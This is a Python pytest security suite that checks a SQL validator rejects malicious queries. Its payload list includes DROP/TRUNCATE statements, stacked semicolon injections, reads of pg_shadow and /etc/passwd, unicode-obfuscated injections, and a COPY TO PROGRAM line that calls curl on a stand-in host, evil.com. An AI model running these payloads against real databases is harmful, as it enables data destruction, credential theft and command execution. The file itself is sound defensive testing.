"""Security tests validating that malicious, unauthorized, or destructive SQL is rejected.

Enforces Layer 2 of DataQuery's defense-in-depth model.
Every payload in this comprehensive suite MUST be rejected by `validate_sql()`:
- result.valid == False
- result.reasons has at least one explanation
- result.validated_sql is None
"""

import pytest

from app.security.sql_validator import validate_sql

MALICIOUS_PAYLOADS = [
    # --- DML Keywords ---
    "INSERT INTO customers (name, email, region, signup_date) VALUES ('Evil', 'evil@test.com', 'North', '2024-01-01')",
    "UPDATE orders SET status = 'cancelled'",
    "DELETE FROM products WHERE id = 1",
    "MERGE INTO customers c USING orders o ON c.id = o.customer_id WHEN MATCHED THEN UPDATE SET name = 'hacked'",
    # --- DDL Keywords ---
    "DROP TABLE customers",
    "DROP TABLE orders CASCADE",
    "ALTER TABLE products ADD COLUMN backdoor TEXT",
    "CREATE TABLE hacker_loot (data TEXT)",
    "TRUNCATE TABLE order_items",
    "TRUNCATE order_items",
    # --- DCL & Privileges ---
    "GRANT ALL PRIVILEGES ON customers TO public",
    "REVOKE SELECT ON customers FROM dq_readonly",
    # --- Multi-Statement & Semicolon Injections ---
    "SELECT 1; DROP TABLE orders",
    "SELECT id FROM customers; DELETE FROM orders;",
    "SELECT 1 /* comment */ ; DROP TABLE orders",
    "SELECT 1; -- line comment\nDROP TABLE orders",
    "SELECT 1; /* nested comment */ DROP TABLE orders",
    "sElEcT * FrOm CuStOmErS; dRoP tAbLe OrDeRs",
    "  \t\n SELECT id FROM customers ; \t DROP TABLE orders  ",
    "SELECT 1; ;",
    # --- SELECT INTO & Row Locking ---
    "SELECT * INTO new_table FROM customers",
    "SELECT id, name INTO TEMPORARY TABLE temp_cust FROM customers",
    "SELECT * FROM orders FOR UPDATE",
    "SELECT * FROM orders FOR SHARE",
    "SELECT * FROM orders FOR NO KEY UPDATE",
    "SELECT * FROM orders FOR KEY SHARE",
    # --- Dangerous & Banned Functions ---
    "SELECT pg_sleep(5)",
    "SELECT pg_sleep(0.5) FROM customers",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_read_binary_file('pg_hba.conf')",
    "SELECT set_config('statement_timeout', '0', false)",
    "SELECT version()",
    "SELECT current_user",
    "SELECT session_user",
    # --- System Catalogs & Metadata Probing ---
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT * FROM pg_catalog.pg_user",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM information_schema.columns",
    "SELECT * FROM pg_shadow",
    "SELECT * FROM pg_authid",
    "SELECT * FROM pg_database",
    "SELECT * FROM pg_roles",
    # --- Application Metadata Schema Access ---
    "SELECT * FROM app.dq_query_history",
    'SELECT * FROM "app"."dq_query_history"',
    # --- Unknown Tables & Columns ---
    "SELECT secret_column FROM customers",
    "SELECT password FROM customers",
    "SELECT * FROM nonexistent_table",
    "SELECT * FROM users",
    # --- Unknown Functions ---
    "SELECT malicious_func(name) FROM customers",
    "SELECT system_exec('whoami')",
    # --- Stacked CTE with Data Modification ---
    "WITH del AS (DELETE FROM orders RETURNING *) SELECT * FROM del",
    "WITH upd AS (UPDATE customers SET name = 'hacked' RETURNING *) SELECT * FROM upd",
    "WITH ins AS (INSERT INTO customers (name, email, region, signup_date) VALUES ('x','x@x.com','x','2024-01-01') RETURNING *) SELECT * FROM ins",
    # --- Administrative & Execution Commands ---
    "COPY customers TO PROGRAM 'curl evil.com'",
    "COPY (SELECT * FROM customers) TO '/tmp/loot.csv'",
    "DO $$ BEGIN RAISE NOTICE 'hack'; END $$;",
    "CALL drop_all_tables()",
    "SET statement_timeout = 0",
    "VACUUM FULL customers",
    "EXPLAIN ANALYZE SELECT * FROM customers",
    "LOCK TABLE customers IN ACCESS EXCLUSIVE MODE",
    # --- Obfuscation, Unicode & Null Bytes ---
    "SELECT 'test' \x00 'injection'",
    "SELECT * FROM customers \u003B DROP TABLE orders",
    "SELECT \u002A FROM \u0070\u0067\u005F\u0073\u0068\u0061\u0064\u006F\u0077",
    "SELECT $$pg_shadow$$ FROM customers",
]


@pytest.mark.security
def test_at_least_40_malicious_payloads_defined() -> None:
    """Verify test catalog satisfies the requirement of at least 40 attack vectors."""
    assert len(MALICIOUS_PAYLOADS) >= 40


@pytest.mark.security
@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
def test_malicious_payloads_strictly_rejected(payload: str) -> None:
    """Verify every malicious payload is rejected with a documented reason and no validated token."""
    result = validate_sql(payload)
    assert result.valid is False, f"Vulnerability: Payload was accepted! SQL: {payload}"
    assert len(result.reasons) > 0, f"Rejected payload had no explanatory reasons: {payload}"
    assert result.validated_sql is None, f"Rejected payload must not yield ValidatedSQL token: {payload}"
